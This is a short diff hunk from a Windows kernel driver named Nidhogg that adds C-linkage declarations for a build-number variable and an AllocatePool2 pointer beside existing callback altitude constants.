@@ -24,6 +24,11 @@ constexpr wchar_t DRIVER_SYMBOLIC_LINK[] = L"\\??\\Nidhogg";
 constexpr wchar_t OB_CALLBACKS_ALTITUDE[] = L"31105.6171";
 constexpr wchar_t REG_CALLBACK_ALTITUDE[] = L"31122.6172";
 
+extern "C" {
+    ULONG WindowsBuildNumber = 0;
+    PVOID AllocatePool2 = NULL;
+}
+
 // Prototypes.
 NTSTATUS NidhoggEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath);
 DRIVER_UNLOAD NidhoggUnload;
